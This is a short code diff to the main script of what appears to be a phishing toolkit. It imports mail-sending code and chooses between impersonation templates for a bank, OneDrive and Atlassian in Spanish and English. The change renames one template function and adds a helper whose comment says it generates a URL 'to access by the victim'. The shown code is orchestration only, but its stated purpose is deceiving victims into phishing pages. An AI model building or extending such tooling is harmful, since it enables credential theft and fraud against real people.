@@ -5,7 +5,7 @@ import smtplib
 
 #Import templates Spanish
 from Templates.spanish.bankEs import BankEs
-from Templates.spanish.onedriveEs import OneDriveEs
+from Templates.spanish.onedriveEs import onedrive_es
 from Templates.spanish.atalasianEs import AtalassianEs
 
 #Import templates English
@@ -14,7 +14,9 @@ from Templates.english.onedriveEn import OneDriveEn
 from Templates.english.atalasianEn import AtalassianEn
 
 #Import helpers
-from helper.helper import getPath,generateFolderReport
+from helper.helper import getPath,generateFolderReport,generateUrlAccess
+
+
 
 Version="0.1"
 
@@ -31,6 +33,9 @@ def main():
 
     #Save path and create directory where the user save the reports
     generateFolderReport()
+
+    #generate url to access by the victim
+    generateUrlAccess()
 
     #Bank Template
     if value == 1:
@@ -62,7 +67,7 @@ def main():
         while language!=0|language!=1:
             if language==0:
                 #Template Spanish
-                OneDriveEs()
+                onedrive_es()
             else:
                 #Template English
                 OneDriveEn()
